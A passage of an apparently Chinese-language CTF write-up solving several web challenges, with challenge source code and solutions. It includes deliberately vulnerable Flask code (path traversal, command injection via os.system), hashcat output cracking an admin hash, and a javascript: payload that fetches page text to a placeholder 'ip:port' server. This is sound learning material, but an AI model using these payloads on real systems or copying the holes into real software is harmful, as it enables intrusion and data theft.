class=&quot;container&quot;&gt;</span><br><span class="hljs-string">        &lt;h2 class=&quot;text-center&quot;&gt;server code (encoded)&lt;/h2&gt;</span><br><span class="hljs-string">        &lt;div class=&quot;text-center&quot; style=&quot;word-break:break-all;&quot;&gt;</span><br><span class="hljs-string">        &#123;%% raw %%&#125;</span><br><span class="hljs-string">            %s</span><br><span class="hljs-string">        &#123;%% endraw %%&#125;</span><br><span class="hljs-string">        &lt;/div&gt;</span><br><span class="hljs-string">        &lt;div class=&quot;text-center&quot;&gt;</span><br><span class="hljs-string">            &lt;a href=&quot;/logout&quot; class=&quot;btn btn-danger&quot;&gt;Logout&lt;/a&gt;</span><br><span class="hljs-string">        &lt;/div&gt;</span><br><span class="hljs-string">    &lt;/div&gt;</span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>            % base64.b64encode(<span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&quot;rb&quot;</span>).read()).decode()<br>        )<br>    <span class="hljs-keyword">return</span> render_template_string(html_template)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/logout&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">logout</span>():<br>    resp = redirect(url_for(<span class="hljs-string">&quot;login&quot;</span>))<br>    resp.delete_cookie(<span class="hljs-string">&quot;jwbcookie&quot;</span>)<br>    <span class="hljs-keyword">return</span> resp<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run()<br></code></pre></td></tr></table></figure><p>æ³¨å†Œä¸€ä¸ªamin1æ‹¿cookieï¼Œbase64è§£ç åå‰åŠæ®µç›´æ¥æ˜¯æ˜æ–‡admi1</p><p>replace(â€˜1â€™,â€™nâ€™,1) ç„¶åbase64ç¼–ç å°±å¯ä»¥è§£æä¸ºadminäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> app <span class="hljs-keyword">import</span> parse_cookie<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    cookie_b64 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;../.idea/httpRequests/http-client.cookies&#x27;</span>, <span class="hljs-string">&quot;r&quot;</span>).readlines()[<span class="hljs-number">2</span>].split(<span class="hljs-string">&#x27;\t&#x27;</span>)[-<span class="hljs-number">2</span>]<br>    cookie = base64.b64decode(cookie_b64, validate=<span class="hljs-literal">True</span>).decode()<br>    new_cookie = cookie.replace(<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(base64.b64encode(new_cookie.encode()).decode())<br>    <span class="hljs-built_in">print</span>(parse_cookie(base64.b64encode(new_cookie.encode()).decode()))<br></code></pre></td></tr></table></figure><p>æµ‹è¯•ä»£ç éƒ½åœ¨ä»“åº“é‡Œ</p><h2 id="ACTF-upload"><a href="#ACTF-upload" class="headerlink" title="ACTF upload"></a>ACTF upload</h2><p>éšä¾¿æ³¨å†Œä¸€ä¸ªï¼Œä¸Šä¼ æ–‡ä»¶ï¼Œç„¶åè·³è½¬&#x2F;upload?file_path&#x3D;{uuid}.png</p><p>file_path&#x3D;..&#x2F;app.pyè¯»æºç ï¼Œdataåè®®ï¼Œbase64è§£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, redirect, url_for, flash, session<br><br>app = Flask(__name__)<br>app.secret_key = os.getenv(<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>):<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;upload&#x27;</span>))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br>        <span class="hljs-keyword">if</span> username == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>            <span class="hljs-keyword">if</span> hashlib.sha256(password.encode()).hexdigest() == <span class="hljs-string">&#x27;32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0&#x27;</span>:<br>                session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br>                <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>            <span class="hljs-keyword">else</span>:<br>                flash(<span class="hljs-string">&#x27;Invalid password&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        &lt;h1&gt;Login&lt;/h1&gt;</span><br><span class="hljs-string">        &lt;h2&gt;No need to register.&lt;/h2&gt;</span><br><span class="hljs-string">        &lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt;</span><br><span class="hljs-string">            &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;</span><br><span class="hljs-string">            &lt;br&gt;</span><br><span class="hljs-string">            &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;</span><br><span class="hljs-string">            &lt;br&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span><br><span class="hljs-string">        &lt;/form&gt;</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>):<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>    <br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        f = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>        file_path = <span class="hljs-built_in">str</span>(uuid.uuid4()) + <span class="hljs-string">&#x27;_&#x27;</span> + f.filename<br>        f.save(<span class="hljs-string">&#x27;./uploads/&#x27;</span> + file_path)<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">f&#x27;/upload?file_path=<span class="hljs-subst">&#123;file_path&#125;</span>&#x27;</span>)<br>    <br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> request.args.get(<span class="hljs-string">&#x27;file_path&#x27;</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            &lt;h1&gt;Upload Image&lt;/h1&gt;</span><br><span class="hljs-string">            </span><br><span class="hljs-string">            &lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="hljs-string">                &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span><br><span class="hljs-string">                &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt;</span><br><span class="hljs-string">            &lt;/form&gt;</span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span><br>            <br>        <span class="hljs-keyword">else</span>:<br>            file_path = <span class="hljs-string">&#x27;./uploads/&#x27;</span> + request.args.get(<span class="hljs-string">&#x27;file_path&#x27;</span>)<br>            <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    content = f.read()<br>                    b64 = base64.b64encode(content)<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;&lt;img src=&quot;data:image/png;base64,<span class="hljs-subst">&#123;b64.decode()&#125;</span>&quot; alt=&quot;Uploaded Image&quot;&gt;&#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                os.system(<span class="hljs-string">f&#x27;base64 <span class="hljs-subst">&#123;file_path&#125;</span> &gt; /tmp/<span class="hljs-subst">&#123;file_path&#125;</span>.b64&#x27;</span>)<br>                <span class="hljs-comment"># with open(f&#x27;/tmp/&#123;file_path&#125;.b64&#x27;, &#x27;r&#x27;) as f:</span><br>                <span class="hljs-comment">#     return f&#x27;&lt;img src=&quot;data:image/png;base64,&#123;f.read()&#125;&quot; alt=&quot;Uploaded Image&quot;&gt;&#x27;</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Sorry, but you are not allowed to view this image.&#x27;</span><br>                <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>å¦‚æœæ˜¯adminçš„è¯å°±å¯ä»¥å‘½ä»¤æ³¨å…¥äº†</p><p>sha256(password)&#x3D;&#x3D;32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0</p><p>hashcatçˆ†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs bash">â””â”€$ hashcat -m 1400 -a 0 32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0 /usr/share/wordlists/rockyou.txt<br>hashcat (v6.2.6) starting<br><br>OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="hljs-comment">#1 [The pocl project]</span><br>==================================================================================================================================================<br>* Device <span class="hljs-comment">#1: cpu-skylake-avx512-AMD Ryzen 9 7940H w/ Radeon 780M Graphics, 2719/5502 MB (1024 MB allocatable), 16MCU</span><br><br>Minimum password length supported by kernel: 0<br>Maximum password length supported by kernel: 256<br><br>Hashes: 1 digests; 1 unique digests, 1 unique salts<br>Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates<br>Rules: 1<br><br>Optimizers applied:<br>* Zero-Byte<br>* Early-Skip<br>* Not-Salted<br>* Not-Iterated<br>* Single-Hash<br>* Single-Salt<br>* Raw-Hash<br><br>ATTENTION! Pure (unoptimized) backend kernels selected.<br>Pure kernels can crack longer passwords, but drastically reduce performance.<br>If you want to switch to optimized kernels, append -O to your commandline.<br>See the above message to find out about the exact limits.<br><br>Watchdog: Hardware monitoring interface not found on your system.<br>Watchdog: Temperature abort trigger disabled.<br><br>Host memory required <span class="hljs-keyword">for</span> this attack: 4 MB<br><br>Dictionary cache built:<br>* Filename..: /usr/share/wordlists/rockyou.txt<br>* Passwords.: 14344392<br>* Bytes.....: 139921507<br>* Keyspace..: 14344385<br>* Runtime...: 1 sec<br><br>32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0:backdoor<br><br>Session..........: hashcat<br>Status...........: Cracked<br>Hash.Mode........: 1400 (SHA2-256)<br>Hash.Target......: 32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d...3e8ce0<br>Time.Started.....: Tue Apr 29 14:34:07 2025 (1 sec)<br>Time.Estimated...: Tue Apr 29 14:34:08 2025 (0 secs)<br>Kernel.Feature...: Pure Kernel<br>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)<br>Guess.Queue......: 1/1 (100.00%)<br>Speed.#1.........:   870.4 kH/s (0.75ms) @ Accel:512 Loops:1 Thr:1 Vec:16<br>Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)<br>Progress.........: 57344/14344385 (0.40%)<br>Rejected.........: 0/57344 (0.00%)<br>Restore.Point....: 49152/14344385 (0.34%)<br>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1<br>Candidate.Engine.: Device Generator<br>Candidates.#1....: truckin -&gt; YELLOW1<br><br>Started: Tue Apr 29 14:33:28 2025<br>Stopped: Tue Apr 29 14:34:09 2025<br></code></pre></td></tr></table></figure><p>ç„¶åå‘½ä»¤æ³¨å…¥ï¼ˆç”¨ç®¡é“ç¬¦ï¼‰è¯»å°±è¡Œäº†</p><h2 id="eznote"><a href="#eznote" class="headerlink" title="eznote"></a>eznote</h2><p>chromium.exeä¸‹è½½: <a href="https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html">https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html</a></p><p>æ ¸å¿ƒä»£ç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/report&#x27;</span>, <span class="hljs-title function_">async</span> (req, res) =&gt; &#123;<br>    <span class="hljs-keyword">let</span> &#123; url &#125; = req.<span class="hljs-property">body</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(url)<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">await</span> <span class="hljs-title function_">visit</span>(url)<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;success&#x27;</span>)<br>    &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err)<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;error&#x27;</span>)<br>    &#125;<br>&#125;)<br><br><br><span class="hljs-comment">//bot.js</span><br><span class="hljs-keyword">const</span> puppeteer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;puppeteer&#x27;</span>)<br><span class="hljs-keyword">const</span> process = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;process&#x27;</span>)<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">FLAG</span> = (<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> flag = <span class="hljs-string">&#x27;flag&#123;test&#125;&#x27;</span><br>    <span class="hljs-keyword">if</span> (fs.<span class="hljs-title function_">existsSync</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>))&#123;<br>        flag = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>).<span class="hljs-title function_">toString</span>()<br>        fs.<span class="hljs-title function_">unlinkSync</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>)<br>    &#125; <br>    <span class="hljs-keyword">return</span> flag<br>&#125;)()<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">HEADLESS</span> = !!(process.<span class="hljs-property">env</span>.<span class="hljs-property">PROD</span> ?? <span class="hljs-literal">false</span>)<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">sleep</span> = (<span class="hljs-params">sec</span>) =&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(r, sec * <span class="hljs-number">1000</span>))<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">visit</span>(<span class="hljs-params">url</span>) &#123;<br>    <span class="hljs-keyword">let</span> browser = <span class="hljs-keyword">await</span> puppeteer.<span class="hljs-title function_">launch</span>(&#123;<br>        <span class="hljs-attr">headless</span>: <span class="hljs-variable constant_">HEADLESS</span>,<br>        <span class="hljs-attr">executablePath</span>: <span class="hljs-string">&#x27;D:\\download\\Win_1000015_chrome-win\\chrome-win\\chrome.exe&#x27;</span>,<br>        <span class="hljs-attr">args</span>: [<span class="hljs-string">&#x27;--no-sandbox&#x27;</span>],<br>    &#125;)<br>    <span class="hljs-keyword">let</span> page = <span class="hljs-keyword">await</span> browser.<span class="hljs-title function_">newPage</span>()<br><br>    <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">goto</span>(<span class="hljs-string">&#x27;http://localhost:3000/&#x27;</span>)<br><br>    <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">waitForSelector</span>(<span class="hljs-string">&#x27;#title&#x27;</span>)<br>    <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;#title&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, &#123;<span class="hljs-attr">delay</span>: <span class="hljs-number">100</span>&#125;)<br>    <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;#content&#x27;</span>, <span class="hljs-variable constant_">FLAG</span>, &#123;<span class="hljs-attr">delay</span>: <span class="hljs-number">100</span>&#125;)<br>    <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">click</span>(<span class="hljs-string">&#x27;#submit&#x27;</span>, &#123;<span class="hljs-attr">delay</span>: <span class="hljs-number">100</span>&#125;)<br><br>    <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">3</span>)<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;visiting %s&#x27;</span>, url)<br><br>    <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">goto</span>(url)<br>    <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">30</span>)<br>    <span class="hljs-keyword">await</span> browser.<span class="hljs-title function_">close</span>()<br>&#125;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    visit<br>&#125;<br></code></pre></td></tr></table></figure><p>reportæ§åˆ¶boté‡Œgotoçš„url</p><p>è¿™ä¸ªchromeå¯åŠ¨å‚æ•°å¯ä»¥è®¿é—®javascriptä¼ªåè®®</p><p>url&#x3D;javascript:fetch(â€œ<a href="http://ip:port/"+(document.body.innerText)">http://ip:port/&quot;+(document.body.innerText)</a>)</p><p>åœ¨è‡ªå·±æœåŠ¡å™¨ç›‘å¬å°±å¯ä»¥æ‹¿åˆ°æœ‰flagçš„noteid</p><p>ç„¶åç›´æ¥&#x2F;note&#x2F;:noteidè®¿é—®å°±è¡Œ</p><h2 id="Excellent-Site"><a href="#Excellent-Site" class="headerlink" title="Excellent-Site"></a>Excellent-Site</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> smtplib <br><span class="hljs-keyword">import</span> imaplib<br><span class="hljs-keyword">import</span> email<br><span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> email.header <span class="hljs-keyword">import</span> decode_header<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_subjects</span>(<span class="hljs-params">username, password</span>):<br>    imap_server = <span class="hljs-string">&quot;ezmail.org&quot;</span><br>    imap_port = <span class="hljs-number">143</span><br>    <span class="hljs-keyword">try</span>:<br>        mail = imaplib.IMAP4(imap_server, imap_port)<br>        mail.login(username, password)<br>        mail.select(<span class="hljs-string">&quot;inbox&quot;</span>)<br>        status, messages = mail.search(<span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;FROM &quot;admin@ezmail.org&quot;&#x27;</span>)<br>        <span class="hljs-keyword">if</span> status != <span class="hljs-string">&quot;OK&quot;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>        subject = <span class="hljs-string">&quot;&quot;</span><br>        latest_email = messages[<span class="hljs-number">0</span>].split()[-<span class="hljs-number">1</span>]<br>        status, msg_data = mail.fetch(latest_email, <span class="hljs-string">&quot;(RFC822)&quot;</span>)<br>        <span class="hljs-keyword">for</span> response_part <span class="hljs-keyword">in</span> msg_data:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(response_part, <span class="hljs-built_in">tuple</span>):<br>                msg = email.message_from_bytes(response_part  [<span class="hljs-number">1</span>])<br>                subject, encoding = decode_header(msg[<span class="hljs-string">&quot;Subject&quot;</span>])  [<span class="hljs-number">0</span>]<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(subject, <span class="hljs-built_in">bytes</span>):<br>                    subject = subject.decode(encoding <span class="hljs-keyword">if</span> encoding <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        mail.logout()<br>        <span class="hljs-keyword">return</span> subject<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ERROR&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fetch_page_content</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">try</span>:<br>        parsed_url = urlparse(url)<br>        <span class="hljs-keyword">if</span> parsed_url.scheme != <span 